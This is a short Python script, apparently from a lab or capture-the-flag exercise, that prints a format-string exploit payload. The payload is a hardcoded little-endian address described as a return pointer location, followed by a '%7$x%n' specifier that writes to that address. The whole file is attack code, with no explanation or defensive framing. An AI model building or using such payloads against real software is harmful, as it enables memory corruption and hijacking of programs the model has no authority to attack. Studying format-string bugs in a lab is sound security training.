#!/usr/bin/python

# Return pointer location 0xbffff618
payload="\x18\xf6\xff\xbf"  # Address to write over (return pointer)
payload+="%7$x%n"

print(payload)
